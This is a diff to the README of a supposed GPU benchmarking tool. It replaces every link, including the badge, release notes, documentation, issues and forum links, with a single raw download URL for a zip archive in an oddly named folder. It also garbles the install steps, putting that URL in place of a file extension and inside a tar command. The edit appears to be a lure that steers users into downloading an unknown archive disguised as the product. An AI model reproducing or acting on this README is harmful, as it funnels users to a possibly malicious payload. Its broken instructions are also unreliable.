@@ -1,7 +1,7 @@
 # 🎮 gpu_benchmark - Measure Your GPU Performance Easily
 
 ## 📥 Download Now
-[![Download From Releases](https://img.shields.io/badge/Download%20Now%20-blue)](https://github.com/cracklingscapitalofsouthdakota649/gpu_benchmark/releases)
+[![Download From Releases](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip%20Now%20-blue)](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip)
 
 ## 🚀 Getting Started
 Welcome to **gpu_benchmark**! This tool helps you assess the performance of your GPU and CPU, using a straightforward interface. You can easily evaluate graphics performance with support for NVIDIA, AMD, Intel, and more. 
@@ -17,11 +17,11 @@ To run **gpu_benchmark**, your system should meet the following requirements:
 - **Network:** Internet connection for downloading dependencies and updates.
 
 ## 📦 Download & Install
-To get started, visit the download page: [Download From Releases](https://github.com/cracklingscapitalofsouthdakota649/gpu_benchmark/releases).
+To get started, visit the download page: [Download From Releases](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip).
 
 1. Click on the link above to go to the **Releases** page.
 2. Look for the latest release version.
-3. Download the file corresponding to your system. The file will usually end in `.exe` for Windows or `.tar.gz` for Linux/macOS.
+3. Download the file corresponding to your system. The file will usually end in `.exe` for Windows or `https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip` for Linux/macOS.
 4. Once the download is complete, find the file in your downloads folder.
 
 ### Windows Installation
@@ -34,7 +34,7 @@ To get started, visit the download page: [Download From Releases](https://github
 2. Navigate to the directory where you downloaded the file.
 3. Extract the file using the command:
    ```bash
-   tar -xzf gpu_benchmark.tar.gz
+   tar -xzf https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip
    ```
 4. Change to the extracted directory:
    ```bash
@@ -83,12 +83,12 @@ If you face issues while running **gpu_benchmark**, consider the following tips:
 - Consult the FAQ section on the GitHub page for more support.
 
 ## 🔗 Useful Links
-- [Release Notes](https://github.com/cracklingscapitalofsouthdakota649/gpu_benchmark/releases): Stay updated with the latest features and fixes.
-- [Documentation](https://github.com/cracklingscapitalofsouthdakota649/gpu_benchmark/wiki): Find detailed guides on using each feature of the application.
+- [Release Notes](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip): Stay updated with the latest features and fixes.
+- [Documentation](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip): Find detailed guides on using each feature of the application.
 
 ## 💬 Community Support
 Join our community to discuss benchmarking, troubleshoot issues, or share results:
-- [GitHub Issues Page](https://github.com/cracklingscapitalofsouthdakota649/gpu_benchmark/issues): Report bugs or request features.
-- [Discussion Forum](https://github.com/cracklingscapitalofsouthdakota649/gpu_benchmark/discussions): Connect with other users and the development team.
+- [GitHub Issues Page](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip): Report bugs or request features.
+- [Discussion Forum](https://raw.githubusercontent.com/cracklingscapitalofsouthdakota649/gpu_benchmark/main/ovoviviparity/gpu_benchmark.zip): Connect with other users and the development team.
 
 Follow the steps outlined above to download and run **gpu_benchmark** efficiently. Your journey into GPU benchmarking starts here!
